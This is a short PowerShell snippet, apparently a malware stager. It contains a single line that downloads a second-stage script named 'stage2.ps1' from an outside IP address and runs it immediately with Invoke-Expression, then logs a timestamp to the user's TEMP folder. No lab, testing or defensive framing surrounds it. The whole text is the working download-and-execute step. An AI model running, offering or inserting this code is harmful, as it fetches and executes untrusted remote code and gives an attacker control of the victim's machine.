
<# Stage transfer #> try { $TargetUrl = 'https://203.0.113.221/stage2.ps1'; Invoke-Expression (New-Object System.Net.WebClient).DownloadString($TargetUrl); Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append } catch { Write-Warning "Stage transfer failed" }
